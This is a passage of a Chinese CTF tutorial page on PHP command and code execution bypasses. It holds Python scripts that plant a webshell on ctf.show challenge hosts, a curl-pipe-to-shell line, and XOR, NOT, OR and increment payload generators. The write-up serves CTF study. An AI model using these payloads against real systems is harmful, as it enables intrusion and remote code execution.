class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-comment">#curl 335708495|sh</span><br><span class="hljs-string">&#x27;&gt;sh&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;5\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;49\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;08\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;57\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;33\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;rl\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cu\\&#x27;</span>,<br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span>,<br>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;1.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h5 id="环境无dir，可写但不出网"><a href="#环境无dir，可写但不出网" class="headerlink" title="环境无dir，可写但不出网"></a>环境无dir，可写但不出网</h5><p>因为<code>ls -t</code>命令对文件进行排序时只能有一个空格，一个重定向符号，一个管道符，多了排序就乱了，所以不能直接用<code>echo xxx|base64 -d&gt;a.php</code>的方式了，且考虑到万一临时文件过多的情况，也不采用5字符的上传临时文件的方法。解决方案是用<code>$&#123;IFS&#125;</code>代替空格，变成<code>echo$&#123;IFS&#125;xxxxxx|base64 -d&gt;a.php</code></p><p>步骤与<code>4字符-环境无dir，可写</code>基本一致，只是替换了<code>curl命令</code>，变成了<code>echo ...</code></p><p>自动化脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># @Author: h1xa</span><br><span class="hljs-comment"># @Date:   2022-05-06 13:25:41</span><br><span class="hljs-comment"># @Last Modified by:   h1xa</span><br><span class="hljs-comment"># @Last Modified time: 2022-05-10 20:56:17</span><br><span class="hljs-comment"># @email: h1xa@ctfer.com</span><br><span class="hljs-comment"># @link: https://ctfer.com</span><br><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br>url = <span class="hljs-string">&quot;http://499e4b26-b5cd-43a8-b0d1-6a8ec2451dea.challenge.ctf.show/&quot;</span><br><br>payload = [<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-t\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;a&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls\\&#x27;</span>,<br><span class="hljs-string">&#x27;ls&gt;v&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;mv&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;vt&#x27;</span>,<br><span class="hljs-string">&#x27;*v*&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ls&#x27;</span>,<br><span class="hljs-string">&#x27;l*&gt;t&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;cat&#x27;</span>,<br><span class="hljs-string">&#x27;*t&gt;z&#x27;</span>,<br><br><span class="hljs-string">&#x27;&gt;php&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;a.\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\&gt;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;-d\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\ \\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;64\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;se\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ba\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\|\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;4=\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Pz\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;k7\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;XS\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;sx\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;VF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;dF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;X0\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;gk\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;bC\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Zh\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ZX\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;Ag\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;aH\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;9w\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;PD\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;S&#125;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;IF\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;&#123;\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;\\$\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ho\\&#x27;</span>,<br><span class="hljs-string">&#x27;&gt;ec\\&#x27;</span>,<br><br><br><span class="hljs-string">&#x27;sh z&#x27;</span>,<br><span class="hljs-string">&#x27;sh a&#x27;</span><br>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">writeFile</span>(<span class="hljs-params">payload</span>):<br>data=&#123;<br><span class="hljs-string">&quot;cmd&quot;</span>:payload<br>&#125;<br>requests.post(url,data=data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br><span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> payload:<br>writeFile(p.strip())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] create &quot;</span>+p.strip())<br>time.sleep(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check</span>():<br>response = requests.get(url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><span class="hljs-keyword">if</span> response.status_code == requests.codes.ok:<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attack success!!!Webshell is &quot;</span>+url+<span class="hljs-string">&quot;a.php&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>run()<br>check()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>main()<br></code></pre></td></tr></table></figure><h3 id="长度限制总结"><a href="#长度限制总结" class="headerlink" title="长度限制总结"></a>长度限制总结</h3><p>1：当有长度限制的情况下，最少可以在<code>4</code>字符<code>无dir</code>环境下拼接出<code>ls -t</code><br>2：空格不够用时可以用<code>$&#123;IFS&#125;</code>代替，只要命令部分不出现重复的字符组合就行</p><h1 id="代码执行"><a href="#代码执行" class="headerlink" title="代码执行"></a>代码执行</h1><h2 id="代码执行函数"><a href="#代码执行函数" class="headerlink" title="代码执行函数"></a>代码执行函数</h2><p><code>eval()</code>，<code>assert()</code>，<code>preg_replace()</code>，<code>create_function()</code>，<code>array_map()</code>，<code>call_user_func()</code>，<code>call_user_func_array()</code>，<code>array_filter()</code>，<code>uasort()</code>，<code>array_walk_recursive</code>等</p><h2 id="disable-functions绕过"><a href="#disable-functions绕过" class="headerlink" title="disable_functions绕过"></a>disable_functions绕过</h2><p>某些题目表面上没有禁用函数，实际上在<code>php.ini</code>中使用了<code>disable_functions</code>来禁用函数</p><p>可以通过蚁剑的插件或手工绕过</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/disable_functions.png"></p><p>小trick：<code>get形式的代码执行可以用转接头的形式在蚁剑上连接，例如/?1=assert($_POST[2]);</code></p><h2 id="标签闭合绕过"><a href="#标签闭合绕过" class="headerlink" title="标签闭合绕过"></a>标签闭合绕过</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\?|\;/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>闭合了标签，那就造一个新的标签<code>&lt;script language=&quot;php&quot;&gt;system(&#39;tac /f*&#39;)&lt;/script&gt;</code></p><p>小trick：<code>&lt;/script&gt;结束标签自带一个;</code></p><h2 id="标签闭合-长度限制"><a href="#标签闭合-长度限制" class="headerlink" title="标签闭合+长度限制"></a>标签闭合+长度限制</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&lt;=<span class="hljs-number">13</span>)&#123;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;?&gt;&quot;</span>.<span class="hljs-variable">$code</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>构造一个小于13位的参数：<code>&lt;?`$_GET[2]`;</code></p><p>然后可以利用<code>&amp;2</code>传入反弹shell的命令等操作</p><h2 id="无字母数字代码执行"><a href="#无字母数字代码执行" class="headerlink" title="无字母数字代码执行"></a>无字母数字代码执行</h2><p>也是很经典的一类题目，参数中不能出现字母和数字<br>思路就是通过非字母数字的字符经过各种变换构造出任意字母，然后拼接出函数执行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>,<span class="hljs-variable">$code</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br></code></pre></td></tr></table></figure><h3 id="异或xor"><a href="#异或xor" class="headerlink" title="异或xor"></a>异或xor</h3><p>在php中，两个字符进行异或操作后，得到的依然是一个字符，所以说当我们想得到a-z中某个字母时，就可以找到两个非字母数字的字符，只要他们俩的异或结果是这个字母即可。而在php中，两个字符进行异或时，会先将字符串转换成ascii码值，再将这个值转换成二进制，然后一位一位的进行按位异或，异或的规则是：<code>1^1=0,1^0=1,0^1=1,0^0=0</code>，简单的来说就是相同为零，不同为一</p><p>例如<code>(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)</code>，异或后得到<code>system</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/xor.png"></p><p>yu师傅的脚本，用来生成一个字典</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;xor_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[a-z0-9]/i&#x27;</span>; <span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)^<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><p>然后用<code>($a)();</code>的形式执行代码即可，但是要注意<code>PHP7</code>前是不允许用<code>($a)();</code>这样的方法来执行动态函数的</p><p>补充：<code>PHP&gt;8</code>就不支持将没有引号包裹的字符解析为对应字符串了，<code>xx^yy</code>-&gt;<code>&#39;xx&#39;^&#39;yy&#39;</code>，这里<code>x  y</code>代表<code>ascii</code>大于<code>128</code>的值</p><h3 id="取反"><a href="#取反" class="headerlink" title="取反"></a>取反</h3><p>例子</p><figure class="highlight haml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs haml"><span class="hljs-tag">%<span class="hljs-selector-tag">8C</span></span>-10001100<br>逐位取反<br><span class="hljs-tag">%<span class="hljs-selector-tag">73</span></span>-01110011<br></code></pre></td></tr></table></figure><p>利用php的取反符号<code>~</code>来构造任意字母</p><p>yu师傅脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//在命令行中运行</span><br><span class="hljs-comment">/*author yu22x*/</span><br><br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your function: &#x27;</span>);<br><span class="hljs-variable">$system</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-title function_ invoke__">fwrite</span>(STDOUT,<span class="hljs-string">&#x27;[+]your command: &#x27;</span>);<br><span class="hljs-variable">$command</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;\r\n&quot;</span>, <span class="hljs-string">&quot;\r&quot;</span>, <span class="hljs-string">&quot;\n&quot;</span>), <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-title function_ invoke__">fgets</span>(STDIN));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;[*] (~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$system</span>).<span class="hljs-string">&#x27;)(~&#x27;</span>.<span class="hljs-title function_ invoke__">urlencode</span>(~<span class="hljs-variable">$command</span>).<span class="hljs-string">&#x27;);&#x27;</span>;<br></code></pre></td></tr></table></figure><h3 id="或or"><a href="#或or" class="headerlink" title="或or"></a>或or</h3><p>原理与异或一致，利用符号<code>|</code>来构造</p><p>或运算就是有一为一，都是零就是零，比如说<code>3|10</code>，就是<code>0011|1010</code>，结果为<code>1011</code></p><p>脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment">/* author yu22x */</span><br><br><span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;or_rce.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br><span class="hljs-variable">$contents</span>=<span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt;<span class="hljs-number">256</span> ; <span class="hljs-variable">$j</span>++) &#123;<br><br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_i</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$i</span>);<br>                &#125;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$j</span>&lt;<span class="hljs-number">16</span>)&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-string">&#x27;0&#x27;</span>.<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-keyword">else</span>&#123;<br>                        <span class="hljs-variable">$hex_j</span>=<span class="hljs-title function_ invoke__">dechex</span>(<span class="hljs-variable">$j</span>);<br>                &#125;<br>                <span class="hljs-variable">$preg</span> = <span class="hljs-string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="hljs-comment">//根据题目给的正则表达式修改即可</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_i</span>))||<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$preg</span> , <span class="hljs-title function_ invoke__">hex2bin</span>(<span class="hljs-variable">$hex_j</span>)))&#123;<br>                                        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span>;<br>    &#125;<br><br>                <span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_i</span>;<br>                <span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$hex_j</span>;<br>                <span class="hljs-variable">$c</span>=(<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$a</span>)|<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$b</span>));<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&gt;=<span class="hljs-number">32</span>&amp;<span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$c</span>)&lt;=<span class="hljs-number">126</span>) &#123;<br>                        <span class="hljs-variable">$contents</span>=<span class="hljs-variable">$contents</span>.<span class="hljs-variable">$c</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$b</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br>                &#125;<br>        &#125;<br><br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>,<span class="hljs-variable">$contents</span>);<br><span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);<br></code></pre></td></tr></table></figure><h3 id="自增"><a href="#自增" class="headerlink" title="自增"></a>自增</h3><p>利用PHP中的<a href="https://www.php.net/manual/zh/language.operators.increment.php">递增&#x2F;递减运算符</a>，也就是说<code>&#39;a&#39;++ =&gt; &#39;b&#39;</code></p><p>然后利用php强制输出数组时，数组会被转换成字符串<code>Array</code>，拿到<code>A</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/rce/zizeng.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//测试发现7.0.12以上版本不可使用</span><br><span class="hljs-comment">//使用时需要url编码下</span><br><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;<span class="hljs-subst">$_</span>&quot;</span>;<span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>];<span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>;<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span 